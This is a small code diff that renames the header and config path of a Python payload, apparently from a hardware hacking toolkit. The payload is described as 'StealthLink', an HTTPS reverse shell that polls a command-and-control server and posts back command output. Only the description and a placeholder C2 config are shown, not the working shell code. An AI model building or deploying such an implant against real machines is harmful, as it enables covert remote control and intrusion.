@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- StealthLink (HTTPS Stealth Reverse Shell)
+DaRkb0x Payload -- StealthLink (HTTPS Stealth Reverse Shell)
 ---------------------------------------------------------------
 Author: 7h30th3r0n3
 
 Reverse shell over HTTPS with keepalive and exponential backoff.
 Polls a server for commands via GET, sends output via POST.
 
-Config: /root/Raspyjack/loot/StealthLink/config.json
+Config: /root/DaRkb0x/loot/StealthLink/config.json
   {
     "server_url": "https://your-server.com/c2",
     "auth_token": "your-secret-token",
@@ -56,7 +56,7 @@ font = scaled_font()
 
 DEBOUNCE = 0.25
 ROW_H = 12
-CONFIG_PATH = "/root/Raspyjack/loot/StealthLink/config.json"
+CONFIG_PATH = "/root/DaRkb0x/loot/StealthLink/config.json"
 MAX_LOG = 40
 DEFAULT_POLL = 5
 MAX_BACKOFF = 300  # 5 minutes max backoff
